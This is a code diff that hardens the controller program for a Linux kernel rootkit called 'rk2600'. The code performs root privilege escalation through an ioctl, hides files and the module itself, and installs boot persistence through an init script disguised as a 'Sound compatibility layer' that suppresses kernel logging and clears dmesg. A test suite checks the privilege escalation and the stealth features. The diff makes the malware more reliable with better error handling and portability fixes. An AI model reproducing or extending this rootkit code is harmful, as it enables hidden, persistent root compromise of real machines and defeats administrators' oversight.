@@ -17,6 +17,15 @@
 
 #define EXIT_USAGE 2
 
+/* glibc declares ioctl request as unsigned long, musl as int. */
+#ifdef __GLIBC__
+typedef unsigned long ioctl_request_t;
+#else
+typedef int ioctl_request_t;
+#endif
+
+#define IOCTL_REQUEST(command) ((ioctl_request_t)(command))
+
 /* ------------------------------------------------------------------ helpers */
 
 static int open_ctl(void)
@@ -94,14 +103,26 @@ static int copy_file(const char *src, const char *dst)
 		return -1;
 	}
 	while ((nr = read(sfd, buf, sizeof(buf))) > 0) {
-		if (write(dfd, buf, (size_t)nr) != nr) {
-			fprintf(stderr, "Write error on %s: %s\n",
-				dst, strerror(errno));
-			close(sfd);
-			close(dfd);
-			return -1;
+		ssize_t written = 0;
+
+		while (written < nr) {
+			ssize_t nw = write(dfd, buf + written,
+					   (size_t)(nr - written));
+
+			if (nw <= 0) {
+				if (nw == 0)
+					errno = EIO;
+				fprintf(stderr, "Write error on %s: %s\n",
+					dst, strerror(errno));
+				close(sfd);
+				close(dfd);
+				return -1;
+			}
+			written += nw;
 		}
 	}
+	if (nr < 0)
+		fprintf(stderr, "Read error on %s: %s\n", src, strerror(errno));
 	close(sfd);
 	if (close(dfd) < 0) {
 		fprintf(stderr, "Close error on %s: %s\n",
@@ -147,7 +168,7 @@ static int cmd_status(void)
 	if (fd < 0)
 		return -1;
 
-	if (ioctl(fd, RK2600_IOC_STATUS, &st) < 0) {
+	if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_STATUS), &st) < 0) {
 		fprintf(stderr, "Status request failed: %s\n",
 			strerror(errno));
 		close(fd);
@@ -173,7 +194,7 @@ static int cmd_privesc(void)
 	if (fd < 0)
 		return -1;
 
-	if (ioctl(fd, RK2600_IOC_ELEVATE) < 0) {
+	if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_ELEVATE)) < 0) {
 		fprintf(stderr, "Elevation failed: %s\n", strerror(errno));
 		close(fd);
 		return -1;
@@ -202,7 +223,7 @@ static int cmd_hide(const char *name)
 		return -1;
 
 	strncpy(req.name, name, RK2600_NAME_MAX);
-	if (ioctl(fd, RK2600_IOC_HIDE, &req) < 0) {
+	if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_HIDE), &req) < 0) {
 		fprintf(stderr, "Hide failed: %s\n", strerror(errno));
 		close(fd);
 		return -1;
@@ -223,7 +244,7 @@ static int cmd_unhide(const char *name)
 		return -1;
 
 	strncpy(req.name, name, RK2600_NAME_MAX);
-	if (ioctl(fd, RK2600_IOC_UNHIDE, &req) < 0) {
+	if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_UNHIDE), &req) < 0) {
 		fprintf(stderr, "Unhide failed: %s\n", strerror(errno));
 		close(fd);
 		return -1;
@@ -242,6 +263,11 @@ static int cmd_install(const char *ko_path)
 
 	if (geteuid() != 0) {
 		fprintf(stderr, "Install requires root.\n");
+		return -1;
+	}
+	if (access(RK2600_DEVICE_PATH, F_OK) == 0) {
+		fprintf(stderr,
+			"rk2600 is already loaded; uninstall it before reinstalling.\n");
 		return -1;
 	}
 	if (access(ko_path, R_OK) < 0) {
@@ -277,7 +303,7 @@ static int cmd_install(const char *ko_path)
 			RK2600_PERSIST_PATH, strerror(errno));
 		return -1;
 	}
-	fprintf(fp,
+	if (fprintf(fp,
 		"#!/bin/sh\n"
 		"# Sound compatibility layer\n"
 		"printk_lvl=$(cat /proc/sys/kernel/printk | cut -f1)\n"
@@ -285,27 +311,42 @@ static int cmd_install(const char *ko_path)
 		"/sbin/insmod %s 2>/dev/null\n"
 		"echo \"$printk_lvl\" > /proc/sys/kernel/printk\n"
 		"dmesg -c > /dev/null 2>&1\n",
-		dest);
-	fclose(fp);
-	if (chmod(RK2600_PERSIST_PATH, 0755) < 0)
-		fprintf(stderr, "Warning: chmod %s: %s\n",
+		dest) < 0) {
+		fprintf(stderr, "Cannot write %s: %s\n",
 			RK2600_PERSIST_PATH, strerror(errno));
+		fclose(fp);
+		return -1;
+	}
+	if (fclose(fp) < 0) {
+		fprintf(stderr, "Cannot close %s: %s\n",
+			RK2600_PERSIST_PATH, strerror(errno));
+		return -1;
+	}
+	if (chmod(RK2600_PERSIST_PATH, 0755) < 0) {
+		fprintf(stderr, "Cannot chmod %s: %s\n",
+			RK2600_PERSIST_PATH, strerror(errno));
+		return -1;
+	}
 	printf("Persistence: %s\n", RK2600_PERSIST_PATH);
 
 	{
 		char *rcupdate_argv[] = {
 			"rc-update", "add", "local", "default", NULL
 		};
-		spawn(rcupdate_argv);
+		if (spawn(rcupdate_argv) < 0) {
+			fprintf(stderr, "Cannot enable the OpenRC local service.\n");
+			return -1;
+		}
 	}
 
 	printf("Loading module...\n");
 	{
 		char *insmod_argv[] = {"insmod", dest, NULL};
 
-		if (spawn(insmod_argv) < 0)
-			fprintf(stderr,
-				"Warning: insmod failed (already loaded?).\n");
+		if (spawn(insmod_argv) < 0) {
+			fprintf(stderr, "Cannot load %s.\n", dest);
+			return -1;
+		}
 	}
 
 	printf("Installed.\n");
@@ -324,18 +365,22 @@ static int cmd_uninstall(void)
 	}
 
 	/* Unhide module so rmmod can find it */
-	fd = open_ctl();
+	fd = open(RK2600_DEVICE_PATH, O_RDWR | O_CLOEXEC);
 	if (fd >= 0) {
-		ioctl(fd, RK2600_IOC_MODSHOW);
+		if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_MODSHOW)) < 0) {
+			fprintf(stderr, "Cannot reveal module: %s\n", strerror(errno));
+			close(fd);
+			return -1;
+		}
 		close(fd);
-	}
+		{
+			char *rmmod_argv[] = {"rmmod", RK2600_MODULE_NAME, NULL};
 
-	{
-		char *rmmod_argv[] = {"rmmod", RK2600_MODULE_NAME, NULL};
-
-		if (spawn(rmmod_argv) < 0)
-			fprintf(stderr,
-				"Warning: rmmod failed (module not loaded?).\n");
+			if (spawn(rmmod_argv) < 0) {
+				fprintf(stderr, "Cannot unload module; files were kept.\n");
+				return -1;
+			}
+		}
 	}
 
 	if (uname(&uts) == 0) {
@@ -359,9 +404,13 @@ static int cmd_uninstall(void)
 
 static void run_show(const char *label, const char *cmd)
 {
+	int ret;
+
 	printf("\n[%s]\n$ %s\n", label, cmd);
 	fflush(stdout);
-	system(cmd);
+	ret = system(cmd);
+	if (ret == -1)
+		perror("system");
 }
 
 static int run_test(const char *label, const char *cmd, bool expect_fail)
@@ -387,6 +436,18 @@ static int cmd_test(const char *self)
 
 	printf("=== rk2600 test suite ===\n");
 
+	/* Abort instead of turning missing prerequisites into false positives. */
+	if (run_test("Prerequisites: commands",
+		"command -v lsmod >/dev/null && command -v grep >/dev/null && "
+		"command -v cat >/dev/null", false) != 0)
+		return 1;
+	if (run_test("Prerequisites: persistence file",
+		"test -f " RK2600_PERSIST_PATH, false) != 0)
+		return 1;
+	if (run_test("Prerequisites: persistence directory",
+		"test -d " RK2600_PERSIST_DIR, false) != 0)
+		return 1;
+
 	/* Privilege escalation — first, to get root for remaining tests */
 	run_show("Privesc: before", "id");
 
@@ -396,7 +457,8 @@ static int cmd_test(const char *self)
 	total++;
 	fd = open_ctl();
 	if (fd >= 0) {
-		if (ioctl(fd, RK2600_IOC_ELEVATE) == 0 && geteuid() == 0) {
+		if (ioctl(fd, IOCTL_REQUEST(RK2600_IOC_ELEVATE)) == 0 &&
+		    geteuid() == 0) {
 			printf("=> PASS\n");
 			pass++;
 		} else {
@@ -440,16 +502,15 @@ static int cmd_test(const char *self)
 	total++; pass += (run_test("Read: insmod filtered",
 		"cat " RK2600_PERSIST_PATH " | grep insmod", true) == 0);
 
-	/* Write stealth */
-	run_show("Write: append",
+	/* The write must report success and the marker must remain absent. */
+	total++; pass += (run_test("Write: success reported and data dropped",
 		"echo 'RK_TEST_42' >> " RK2600_PERSIST_PATH
-		" && echo '(no error returned)'");
-
-	total++; pass += (run_test("Write: verify dropped",
-		"grep RK_TEST_42 " RK2600_PERSIST_PATH, true) == 0);
+		" && ! grep RK_TEST_42 " RK2600_PERSIST_PATH, false) == 0);
 
 	/* Dynamic hide/unhide */
-	system("touch /test_rk_hide 2>/dev/null");
+	if (run_test("Dynamic fixture creation",
+		"touch /test_rk_hide 2>/dev/null", false) != 0)
+		return 1;
 
 	snprintf(cmd, sizeof(cmd),
 		"%s hide test_rk_hide >/dev/null 2>&1; "
@@ -461,7 +522,8 @@ static int cmd_test(const char *self)
 		"ls / | grep test_rk_hide", self);
 	total++; pass += (run_test("Dynamic unhide", cmd, false) == 0);
 
-	system("rm -f /test_rk_hide 2>/dev/null");
+	if (system("rm -f /test_rk_hide 2>/dev/null") == -1)
+		perror("cleanup test fixture");
 
 	/* Summary */
 	printf("\n=== Results: %d/%d passed ===\n", pass, total);
